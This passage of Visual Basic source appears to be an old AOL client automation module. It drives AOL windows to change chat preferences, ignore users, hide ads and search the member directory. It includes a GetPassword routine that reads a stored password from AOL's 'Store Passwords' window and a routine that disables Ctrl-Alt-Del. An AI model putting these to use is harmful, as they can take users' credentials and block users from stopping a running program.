SendMessage chk%, &HF1, 1, 0
Ico% = FindChildByClass(prvy%, "_AOL_Icon")
For ing = 1 To 16
Ico% = GetWindow(Ico%, GW_HWNDNEXT)
Next ing
Do
    DoEvents
    ClickIcon Ico%
    box% = FindWindow("#32770", "America Online")
Loop Until box% <> 0
KillWin box%
End Sub
Sub UnGhost()
bdy% = FindChildByTitle(AOLMDI, "Buddy List Window")
If bdy% = 0 Then
PoPup 5, "b"
GoTo fin
End If
Do
    DoEvents
    bdy% = FindChildByTitle(AOLMDI, "Buddy List Window")
Loop Until bdy% <> 0
Ico% = FindChildByClass(bdy%, "_AOL_Icon")
For ing = 1 To 4
Ico% = GetWindow(Ico%, GW_HWNDNEXT)
Next ing
ClickIcon% Ico%
ClickIcon% Ico%
ClickIcon% Ico%
fin:
Do
    
    DoEvents
    bdy% = FindChildByTitle(AOLMDI, GetUser & "'s *")
Loop Until bdy% <> 0
Ico% = FindChildByClass(bdy%, "_AOL_Icon")
For ing = 1 To 4
Ico% = GetWindow(Ico%, GW_HWNDNEXT)
Next ing
ClickIcon Ico%
ClickIcon Ico%
ClickIcon Ico%
Do
    DoEvents
    prvy% = FindChildByTitle(AOLMDI, "Privacy Preferences")
    chk% = FindChildByClass(prvy%, "_AOL_Checkbox")
Loop Until chk% <> 0
KillWin bdy%
SendMessage chk%, &HF1, 1, 0
For ing = 1 To 0
chk% = GetWindow(chk%, GW_HWNDNEXT)
SendMessage chk%, &HF1, 1, 0
Next ing
Ico% = FindChildByClass(prvy%, "_AOL_Icon")
For ing = 1 To 16
Ico% = GetWindow(Ico%, GW_HWNDNEXT)
Next ing
Do
    DoEvents
    box% = FindWindow("#32770", "America Online")
    ClickIcon Ico%
Loop Until box% <> 0
KillWin box%
End Sub
Function SetLBFocus(LB_hWnd, IndexN)
tex = PostMessage(LB_hWnd, LB_SETCURSEL, IndexN, 0)
SetLBFocus = tex
End Function
Function SetCBFocus(CB_hWnd, IndexN)
tex = PostMessage(CB_hWnd, CB_SETCURSEL, IndexN, 0)
SetCBFocus = tex
End Function
Sub AOLMailOpen()
'Opens The Mail Via Clicking The Icon
Const LBUTTONDBLCLK = &H203
AOL% = FindWindow("AOL Frame25", vbNullString)
AOL% = FindChildByClass(AOL%, "AOL Toolbar")
AOL% = FindChildByClass(AOL%, "_AOL_Toolbar")
AOL% = FindChildByClass(AOL%, "_AOL_Icon")
AOL% = GetWindow(AOL%, 0)
Click% = SendMessageByNum(AOL%, WM_LBUTTONDOWN, 0&, 0&)
Click% = SendMessageByNum(AOL%, WM_LBUTTONUP, 0&, 0&)
End Sub
Function GetPassword()
AOL% = FindChildByTitle(AOLMDI(), "Store Passwords")
AOL% = FindChildByClass(AOL%, "_AOL_Edit")
'AOL% = GetWindow(AOL%, GW_HWNDNEXT)
'AOL% = GetWindow(AOL%, GW_HWNDNEXT)
'AOL% = GetWindow(AOL%, GW_HWNDNEXT)
'AOL% = GetWindow(AOL%, GW_HWNDNEXT)
'AOL% = GetWindow(AOL%, GW_HWNDNEXT)
'AOL% = GetWindow(AOL%, GW_HWNDNEXT)
GetTrim = SendMessageByNum(AOL%, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(AOL%, 13, GetTrim + 1, TrimSpace$)
GetPassword = TrimSpace$
End Function
Function ClickRoomListBox()
AOL% = AOL40_FindChatRoom()
AOL% = FindChildByClass(AOL%, "_AOL_Listbox")
clicklist% = SendMessageByNum(AOL%, &H203, 0, 0&)
End Function
Sub SendBuddyInvitation(Person, message, Room)
MDI% = AOLMDI
o% = FindChildByTitle(MDI%, "Buddy List Window")
If o% <> 0 Then GoTo JOe
AoL4_Keyword ("bv")
Do:
DoEvents
JOe:
BuddyBox% = FindChildByTitle(MDI%, "Buddy List Window")
Ico1% = FindChildByClass(BuddyBox%, "_AOL_Icon")
ico2% = GetWindow(Ico1%, 2)
Ico3% = GetWindow(ico2%, 2)
Ico4% = GetWindow(Ico3%, 2)
Ico5% = GetWindow(Ico4%, 2)
Ico6% = GetWindow(Ico5%, 2)
Ico7% = GetWindow(Ico6%, 2)
Pause 0.1
AOLClickIcon (Ico7%)
If BuddyBox% <> 0 And Ico7% <> 0 Then Exit Do
Loop
Do:
DoEvents
BuddyChat% = FindChildByTitle(MDI%, "Buddy Chat")
WhoToInvite% = FindChildByClass(BuddyChat%, "_AOL_Edit")
MsgToSend% = GetWindow(WhoToInvite%, 2)
w1% = GetWindow(MsgToSend%, 2)
w2% = GetWindow(w1%, 2)
w3% = GetWindow(w2%, 2)
w4% = GetWindow(w3%, 2)
Roomer% = GetWindow(w4%, 2)
If BuddyChat% <> 0 And WhoToInvite% <> 0 And MsgToSend% <> 0 And Roomer% <> 0 Then Exit Do
Loop
Call SetText(WhoToInvite%, Person)
Call SetText(MsgToSend%, message)
Call SetText(Roomer%, Room)
Pause 0.1
SendBut% = FindChildByClass(BuddyChat%, "_AOL_Icon")
AOLClickIcon (SendBut%)
End Sub
Sub Bold()
Room% = FindRoom()
bol% = FindChildByClass(Room%, "_AOL_Icon")
bol% = GetWindow(bol%, GW_HWNDNEXT)
Click% = SendMessage(bol%, WM_LBUTTONDOWN, 0, 0&)
Click% = SendMessage(bol%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub HtmlCancelShit()
'</html><xmp>
End Sub
Sub Underline()
Room% = FindRoom()
bol% = FindChildByClass(Room%, "_AOL_Icon")
bol% = GetWindow(bol%, GW_HWNDNEXT)
bol% = GetWindow(bol%, GW_HWNDNEXT)
bol% = GetWindow(bol%, GW_HWNDNEXT)
Click% = SendMessage(bol%, WM_LBUTTONDOWN, 0, 0&)
Click% = SendMessage(bol%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub Italic()
Room% = FindRoom()
bol% = FindChildByClass(Room%, "_AOL_Icon")
bol% = GetWindow(bol%, GW_HWNDNEXT)
bol% = GetWindow(bol%, GW_HWNDNEXT)
Click% = SendMessage(bol%, WM_LBUTTONDOWN, 0, 0&)
Click% = SendMessage(bol%, WM_LBUTTONUP, 0, 0&)
End Sub
Public Sub IgnoreByIndex(index As Long)
    Dim Room As Long, sList As Long, iWindow As Long
    Dim iCheck As Long, A As Long, count As Long
    count& = RoomCount&
    If index& > count& - 1 Then Exit Sub
    Room& = FindRoom&
    sList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    Call SendMessage(sList&, LB_SETCURSEL, index&, 0&)
    Call PostMessage(sList&, WM_LBUTTONDBLCLK, 0&, 0&)
    Do
        DoEvents
        iWindow& = FindInfoWindow
    Loop Until iWindow& <> 0&
    DoEvents
    iCheck& = FindWindowEx(iWindow&, 0&, "_AOL_Checkbox", vbNullString)
    DoEvents
        Check% = SendMessageByNum(iCheck&, BM_SETCHECK, True, 0&)
   Call PostMessage(iWindow&, WM_CLOSE, 0&, 0&)
End Sub
Public Sub IgnoreByName(name As String)
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Dim lIndex As Long
    Room& = FindRoom&
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> GetUser$ And LCase(ScreenName$) = LCase(name$) Then
                lIndex& = index&
                Call IgnoreByIndex(lIndex&)
                DoEvents
                Exit Sub
            End If
        Next index&
        Call CloseHandle(mThread)
    End If
End Sub
Public Sub UnIgnoreByIndex(index As Long)
    Dim Room As Long, sList As Long, iWindow As Long
    Dim iCheck As Long, A As Long, count As Long
    count& = RoomCount&
    If index& > count& - 1 Then Exit Sub
    Room& = FindRoom&
    sList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    Call SendMessage(sList&, LB_SETCURSEL, index&, 0&)
    Call PostMessage(sList&, WM_LBUTTONDBLCLK, 0&, 0&)
    Do
        DoEvents
        iWindow& = FindInfoWindow
    Loop Until iWindow& <> 0&
    DoEvents
    iCheck& = FindWindowEx(iWindow&, 0&, "_AOL_Checkbox", vbNullString)
    DoEvents
        Check% = SendMessageByNum(iCheck&, BM_SETCHECK, False, 0&)
    Call PostMessage(iWindow&, WM_CLOSE, 0&, 0&)
End Sub
Public Sub UnIgnoreByName(name As String)
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Dim lIndex As Long
    Room& = FindRoom&
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> GetUser$ And LCase(ScreenName$) = LCase(name$) Then
                lIndex& = index&
                Call UnIgnoreByIndex(lIndex&)
                DoEvents
                Exit Sub
            End If
        Next index&
        Call CloseHandle(mThread)
    End If
End Sub
Public Function IsLeapYear(yr As Variant) As Boolean
   If VarType(yr) = vbDate Then
      IsLeapYear = (Day(DateSerial(Year(yr), 2, 29)) = 29)
   Else
      IsLeapYear = (Day(DateSerial(yr, 2, 29)) = 29)
   End If
End Function
Public Function IsEven(ByVal I As Long) As Boolean
   IsEven = Not -(I And 1)
End Function
Public Function IsOdd(ByVal I As Long) As Boolean
   IsOdd = -(I And 1)
End Function
Public Function IsPrime(ByVal n As Long) As Boolean
    Dim I As Long
    IsPrime = False
    If n <> 2 And (n And 1) = 0 Then Exit Function 'test if div 2
    If n <> 3 And n Mod 3 = 0 Then Exit Function 'test if div 3
    For I = 6 To Sqr(n) Step 6
        If n Mod (I - 1) = 0 Then Exit Function
        If n Mod (I + 1) = 0 Then Exit Function
    Next
    IsPrime = True
End Function
Function RoundNumber(nValue As Double, nDigits As Integer) As Double
    RoundNumber = Int(nValue * (10 ^ nDigits) + 0.5) / (10 ^ nDigits)
End Function
Sub ShowAoLToolBar()
delta = FindWindow("AOL Frame25", vbNullString)
sock = FindChildByClass(delta, "AOL Toolbar")
plop = ShowWindow(sock, SW_SHOW)
End Sub
Sub HideAoLToolBar()
delta = FindWindow("AOL Frame25", vbNullString)
sock = FindChildByClass(delta, "AOL Toolbar")
plop = ShowWindow(sock, SW_HIDE)
End Sub
Sub KillChatAdvertise()
chat% = AOL40_FindChatRoom()
pict% = FindChildByClass(chat%, "_AOL_Image")
Call SendMessage(pict%, WM_CLOSE, 0, 0)
End Sub
Sub KillDownloadAdvertise()
home% = FindChildByTitle(AOLMDI, "File Transfer")
Dl% = FindChildByClass(home%, "_AOL_Image")
Call SendMessage(Dl%, WM_CLOSE, 0, 0)
End Sub
Sub KillMailAdvertise()
Dim Add%
mail% = FindChildByTitle(AOLMDI, GetUser & "'s Online Mailbox")
Add% = FindChildByClass(mail%, "_AOL_Image")
Call SendMessage(Add%, WM_CLOSE, 0, 0)
End Sub
Sub ShowMailAdvertise()
Dim Add%
mail% = FindChildByTitle(AOLMDI, GetUser & "'s Online Mailbox")
Add% = FindChildByClass(mail%, "_AOL_Image")
Call SendMessage(Add%, SW_SHOW, 0, 0)
End Sub
Sub ClickSendAfterError(Recipiants)
AOL% = FindWindow("AOL Frame25", vbNullString)
Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Fwd: ")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)
For GetIcon = 1 To 14
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon
AOLClickIcon (AOIcon%)
Do: DoEvents
AOMail% = FindChildByTitle(MDI%, "Fwd: ")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
Loop Until AOEdit% = 0
End Sub
Sub WaitForMailToLoad()
Do
box% = FindChildByTitle(AOLMDI(), GetUser & "'s Online Mailbox")
Loop Until box% <> 0
List = FindChildByClass(box%, "_AOL_Tree")
Do
DoEvents
M1% = SendMessage(List, LB_GETCOUNT, 0, 0&)
timeout (1)
M2% = SendMessage(List, LB_GETCOUNT, 0, 0&)
timeout (1)
M3% = SendMessage(List, LB_GETCOUNT, 0, 0&)
Loop Until M1% = M2% And M2% = M3%
M3% = SendMessage(List, LB_GETCOUNT, 0, 0&)
timeout (1)
End Sub
Sub AOLMsgClose()
Dim AOLMSG%
AOLMSG% = FindWindow("#32770", "America Online")
If AOLMSG% <> 0 Then X = SendMessage(AOLMSG%, WM_CLOSE, 0, 0)
End Sub
Public Sub CloseMailBox()
X = FindChildByTitle(AOLMDI(), "" + GetUser + "'s Online Mailbox")
Call ShowWindow(X, SW_HIDE)
End Sub
Sub CloseInvalid()
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then
CloseWin (aolcl%)
Pause (1)
End If
End Sub
Function SearchCombo(Combo As ComboBox, Search As String) As Boolean
Dim X As Integer
For X = 0 To Combo.ListCount - 1
DoEvents
    If LCase(Trim(Combo.List(X))) Like LCase(Trim(Search)) Then SearchCombo = True: Exit Function
Next X
SearchCombo = False
End Function
Function SearchList(List As ListBox, Search As String) As Boolean
Dim X As Integer
For X = 0 To List.ListCount - 1
DoEvents
    If LCase(Trim(List.List(X))) Like LCase(Trim(Search)) Then SearchList = True: Exit Function
Next X
SearchList = False
End Function
Public Sub DisableCtrlAltDel()
Dim Ret As Integer
Dim pOld As Boolean
Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub
Public Sub EnableCtrlAltDel()
Dim Ret As Integer
Dim pOld As Boolean
Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
End Sub
Function HowLongWindowsHasBeenRunning()
millI = GetTickCount
HowLongWindowsHasBeenRunning = millI / 1000 / 60
End Function
Sub RefreshW(hwnd)
success$ = UpdateWindow(hwnd)
End Sub
Sub DirectoryCreate(dir)
MkDir dir
End Sub
Sub DirectoryDelete(dir)
RmDir (dir)
End Sub
Sub FileDelete(file)
Kill (file)
End Sub
Sub FileOpen(file)
Shell (file)
End Sub
Sub FileReName(sFromLoc As String, sToLoc As String)
Name sOldLoc As sNewLoc
End Sub
Sub OpenCD()
retvalue = mciSendString("set CDAudio door open", vbNullString, 0, 0)
End Sub
Sub CloseCD()
retvalue = mciSendString("set CDAudio door closed", vbNullString, 0, 0)
End Sub
Sub Capslock(Value As Boolean)
       Call SetKeyState(vbKeyCapital, Value)
End Sub
Private Sub SetKeyState(intKey As Integer, fTurnOn As Boolean)
       Dim abytBuffer(0 To 255) As Byte
       GetKeyboardState abytBuffer(0)
       abytBuffer(intKey) = CByte(Abs(fTurnOn))
       SetKeyboardState abytBuffer(0)
End Sub
Sub DoubleClick(hwnd As Integer)
o% = SendMessageByNum(hwnd, WM_LBUTTONDBLCLK, 0, 0)
End Sub
Sub RightClick(hwnd As Integer)
o% = SendMessageByNum(hwnd, WM_RBUTTONDOWN&, 0, 0)
o% = SendMessageByNum(hwnd, WM_RBUTTONUP&, 0, 0)
End Sub
Sub ClickPrefs()
'clicks the chat preferences button in the chat room
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca% = FindChildByTitle(MDI%, "" + AOL40_GetRoomName + "")
AOIcon2% = FindChildByClass(caca%, "_AOL_Icon")
For l = 1 To 15
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
End Sub
Sub ClickChatSend()
'clicks the chat send button in the chat room
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca% = FindChildByTitle(MDI%, "" + AOL40_GetRoomName + "")
AOIcon2% = FindChildByClass(caca%, "_AOL_Icon")
For l = 1 To 5
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, False)
End Sub
Sub ClickFindAChat()
'clicks the find a chat button in the chat room
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca% = FindChildByTitle(MDI%, "" + AOL40_GetRoomName + "")
AOIcon2% = FindChildByClass(caca%, "_AOL_Icon")
For l = 1 To 11
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
End Sub
Sub ClickUpdateProfile()
'clicks the update button in the edit profile form
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca% = FindChildByTitle(MDI%, "Edit Your Online Profile")
AOIcon2% = FindChildByClass(caca%, "_AOL_Icon")
For l = 1 To 0
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
Pause 2
AOLMsgClose
End Sub
Sub ClickDeleteProfile()
'clicks the delete button in the edit profile form
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca% = FindChildByTitle(MDI%, "Edit Your Online Profile")
AOIcon2% = FindChildByClass(caca%, "_AOL_Icon")
For l = 1 To 1
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
Pause 0.4
SendKeys ("{tab}")
Pause 0.2
SendKeys "~"
End Sub
Sub ClickWhosChatting()
'clicks the who's chatting button on the find a chat form
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca% = FindChildByTitle(MDI%, "Find a Chat")
AOIcon2% = FindChildByClass(caca%, "_AOL_Icon")
For l = 1 To 8
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
End Sub
Sub ClickGoChat()
'clicks the go chat button on the find a chat form
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
caca% = FindChildByTitle(MDI%, "Find a Chat")
AOIcon2% = FindChildByClass(caca%, "_AOL_Icon")
For l = 1 To 9
AOIcon2% = GetWindow(AOIcon2%, 2)
Next l
Call ClickIcon(AOIcon2%, True)
End Sub
Sub MemberDirAll(said As String)
AoL4_Keyword ("aol://4950:0000010000|all:" + said + "")
End Sub
Sub MemberDirLocation(said As String)
AoL4_Keyword ("aol://4950:0000010000|location:" + said + "")
End Sub
Sub MemberDirName(said As String)
AoL4_Keyword ("aol://4950:0000010000|member_name:" + said + "")
End Sub
Sub MemberDirBirthdate(said As String)
AoL4_Keyword ("aol://4950:0000010000|advanced:|birthdate:" + said + "")
End Sub
Sub MemberDirMaritalStatus(said As String)
AoL4_Keyword ("aol://4950:0000010000|advanced:|marital_status:" + said + "")
End Sub
Sub MemberDirHobbies(said As String)
AoL4_Keyword ("aol://4950:0000010000|advanced:|hobbies:" + said + "")
End Sub
Sub MemberDirOccupation(said As String)
AoL4_Keyword ("aol://4950:0000010000|advanced:|occupation:" + said + "")
End Sub
Sub MemberDirComp(said As String)
AoL4_Keyword ("aol://4950:0000010000|advanced:|computer:" + said + "")
End Sub
Sub MemberDirQuote(said As String)
AoL4_Keyword ("aol://4950:0000010000|advanced:|quote:" + said + "")
End Sub
Sub MemberDirSex(said As String)
AoL4_Keyword ("aol://4950:0000010000|advanced:|sex:" + said + "")
End Sub
Function MemberSearchResults() As String
parhand1& = FindWindow("AOL Frame25", "America  Online")
parhand2& = FindWindowEx(parhand1&, 0, "MDIClient", vbNullString)
ourparent& = FindWindowEx(parhand2&, 0, "AOL Child", vbNullString)
OurHandle& = FindWindowEx(ourparent&, 0, "_AOL_Static", vbNullString)
numb = GetText(OurHandle&)
numb = ReplaceCharacters(numb, "Not finding who you are looking for?  Use Advanced Search for better results.", "")
MemberSearchResults$ = numb
End Function
Sub PrefsMembersArrive(val As Boolean)
chat% = FindChildByClass(AOL40_FindChatRoom(), "_AOL_ICON")
AOIcon% = GetWindow(chat%, 2)
A = GetWindow(AOIcon%, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
ClickIcon (A)
Do: DoEvents
aom = FindWindow("_AOL_MODAL", vbNullString)
Loop Until aom <> 0
timeout 1
aom = FindWindow("_AOL_MODAL", vbNullString)
chk = FindChildByClass(aom, "_AOL_CheckBox")
C1 = GetWindow(chk, 2)
C2 = GetWindow(C1, 2)
C3 = GetWindow(C2, 2)
C4 = GetWindow(C4, 2)
X = SendMessage(chk, BM_SETCHECK, val, 0)
OKButton% = FindChildByClass(aom, "_AOL_ICON")
ClickIcon (OKButton%)
End Sub
Sub PrefsMembersLeave(val As Boolean)
chat% = FindChildByClass(AOL40_FindChatRoom(), "_AOL_ICON")
AOIcon% = GetWindow(chat%, 2)
A = GetWindow(AOIcon%, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
ClickIcon (A)
Do: DoEvents
aom = FindWindow("_AOL_MODAL", vbNullString)
Loop Until aom <> 0
timeout 1
aom = FindWindow("_AOL_MODAL", vbNullString)
chk = FindChildByClass(aom, "_AOL_CheckBox")
C1 = GetWindow(chk, 2)
C2 = GetWindow(C1, 2)
C3 = GetWindow(C2, 2)
C4 = GetWindow(C4, 2)
X = SendMessage(C1, BM_SETCHECK, val, 0)
OKButton% = FindChildByClass(aom, "_AOL_ICON")
ClickIcon (OKButton%)
End Sub
Sub PrefsDoubleSpaceIncoming(val As Boolean)
chat% = FindChildByClass(AOL40_FindChatRoom(), "_AOL_ICON")
AOIcon% = GetWindow(chat%, 2)
A = GetWindow(AOIcon%, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
ClickIcon (A)
Do: DoEvents
aom = FindWindow("_AOL_MODAL", vbNullString)
Loop Until aom <> 0
timeout 1
aom = FindWindow("_AOL_MODAL", vbNullString)
chk = FindChildByClass(aom, "_AOL_CheckBox")
C1 = GetWindow(chk, 2)
C2 = GetWindow(C1, 2)
C3 = GetWindow(C2, 2)
C4 = GetWindow(C4, 2)
X = SendMessage(C2, BM_SETCHECK, val, 0)
OKButton% = FindChildByClass(aom, "_AOL_ICON")
ClickIcon (OKButton%)
End Sub
Sub PrefsAlphabatizeRoomList(val As Boolean)
chat% = FindChildByClass(AOL40_FindChatRoom(), "_AOL_ICON")
AOIcon% = GetWindow(chat%, 2)
A = GetWindow(AOIcon%, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
ClickIcon (A)
Do: DoEvents
aom = FindWindow("_AOL_MODAL", vbNullString)
Loop Until aom <> 0
timeout 1
aom = FindWindow("_AOL_MODAL", vbNullString)
chk = FindChildByClass(aom, "_AOL_CheckBox")
C1 = GetWindow(chk, 2)
C2 = GetWindow(C1, 2)
C3 = GetWindow(C2, 2)
C4 = GetWindow(C4, 2)
X = SendMessage(C3, BM_SETCHECK, val, 0)
OKButton% = FindChildByClass(aom, "_AOL_ICON")
ClickIcon (OKButton%)
Pause 1
AOLMsgClose
End Sub
Sub PrefsChatSounds(val As Boolean)
chat% = FindChildByClass(AOL40_FindChatRoom(), "_AOL_ICON")
AOIcon% = GetWindow(chat%, 2)
A = GetWindow(AOIcon%, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
ClickIcon (A)
Do: DoEvents
aom = FindWindow("_AOL_MODAL", vbNullString)
Loop Until aom <> 0
timeout 1
aom = FindWindow("_AOL_MODAL", vbNullString)
chk = FindChildByClass(aom, "_AOL_CheckBox")
C1 = GetWindow(chk, 2)
C2 = GetWindow(C1, 2)
C3 = GetWindow(C2, 2)
C4 = GetWindow(C3, 2)
X = SendMessage(C4, BM_SETCHECK, val, 0)
OKButton% = FindChildByClass(aom, "_AOL_ICON")
ClickIcon (OKButton%)
End Sub
Function PrefsSetAll(arrive, leave, doublespace, alphabatize, sounds) As Boolean
chat% = FindChildByClass(AOL40_FindChatRoom(), "_AOL_ICON")
AOIcon% = GetWindow(chat%, 2)
A = GetWindow(AOIcon%, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
A = GetWindow(A, 2)
ClickIcon (A)
Do: DoEvents
aom = FindWindow("_AOL_MODAL", vbNullString)
Loop Until aom <> 0
timeout 1
aom = FindWindow("_AOL_MODAL", vbNullString)
chk = FindChildByClass(aom, "_AOL_CheckBox")
C1 = GetWindow(chk, 2)
C2 = GetWindow(C1, 2)
C3 = GetWindow(C2, 2)
C4 = GetWindow(C3, 2)
X = SendMessage(chk, BM_SETCHECK, arrive, 0)
X = SendMessage(C1, BM_SETCHECK, leave, 0)
X = SendMessage(C2, BM_SETCHECK, doublespace, 0)
X = SendMessage(C3, BM_SETCHECK, alphabatize, 0)
X = SendMessage(C4, BM_SETCHECK, sounds, 0)
OKButton% = FindChildByClass(aom, "_AOL_ICON")
ClickIcon (OKButton%)
Pause 1
AOLMsgClose
End Function
Function AppendVbTextBoxToRoomTextBox(frm As Form)
Dim bbb
AOL% = FindWindow("AOL Frame25", vbNullString)
    MDI% = FindChildByClass(AOL%, "MDIClient")
    Firs% = GetWindow(MDI%, 5)
    listers% = FindChildByClass(Firs%, "RICHCNTL")
    listere% = FindChildByClass(Firs%, "RICHCNTL")
    listerb% = FindChildByClass(Firs%, "_AOL_Listbox")
    Do While (listers% = 0 Or listere% = 0 Or listerb% = 0) And (l <> 100)
            DoEvents
            Firs% = GetWindow(Firs%, 2)
            listers% = FindChildByClass(Firs%, "RICHCNTL")
            listere% = FindChildByClass(Firs%, "RICHCNTL")
            listerb% = FindChildByClass(Firs%, "_AOL_Listbox")
            If listers% And listere% And listerb% Then Exit Do
            l = l + 1
    Loop
    If (l < 100) Then
        Room% = Firs%
    End If
    If Room% Then
        hChatEdit% = Find2ndChildByClass(Room%, "RICHCNTL")
        tytytffffdsf = GetText(hChatEdit%)
        Text1 = tytytffffdsf
    sndtext = SendMessageByString(hChatEdit%, WM_SETTEXT, 0, "")
bbb = SetParent(frm.hwnd, hChatEdit%)
    Dim abc As Variant
    Dim xyz As Variant
    abc = 0
    xyz = 0
    frm.Move abc, xyz
End If
End Function
Function Find2ndChildByClass(parentw, childhand)
    Firs% = GetWindow(parentw, 5)
    If UCase(Mid(GetClass(Firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
    Firs% = GetWindow(parentw, 5)
